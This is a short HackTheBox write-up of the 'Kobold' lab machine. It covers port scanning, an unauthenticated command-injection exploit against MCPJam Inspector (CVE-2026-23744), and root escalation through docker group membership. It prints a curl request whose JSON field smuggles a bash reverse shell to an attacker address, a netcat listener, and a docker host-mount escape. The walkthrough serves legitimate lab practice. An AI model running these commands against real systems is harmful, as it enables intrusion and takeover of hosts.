Kobold

HackTheBox · Easy by Brenno M.

Kobold exploits an unauthenticated RCE in a management tool (MCPJam Inspector, CVE-2026-23744) exposed on a high port, and escalates to root by abusing membership of the docker group via a classic container escape.

Reconnaissance

Nmap reveals SSH, nginx (80/443) and an unrecognised service on port 3552, the Arcane container-management platform, which bundles the MCPJam Inspector.

sudo nmap -sS -sV -p- -Pn <IP>
# 22, 80, 443, 3552 (Arcane / MCPJam Inspector)

Exploitation - CVE-2026-23744

The /api/mcp/connect endpoint of MCPJam Inspector v1.4.2 passes input directly to the shell, without authentication or sanitisation. A forged request runs commands and returns a reverse shell as the user ben.

curl -X POST http://<IP>:3552/api/mcp/connect \
  -H 'Content-Type: application/json' \
  -d '{"command":"bash -c \"bash -i >& /dev/tcp/<MY_IP>/4444 0>&1\""}'
nc -lvnp 4444

Escalation - docker group

User ben is (dormantly) a member of the docker group. Activating it with newgrp docker, we launch a privileged container that mounts the host filesystem, since the process runs as root in the container, we can read any host file.

id
newgrp docker
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
cat /root/root.txt
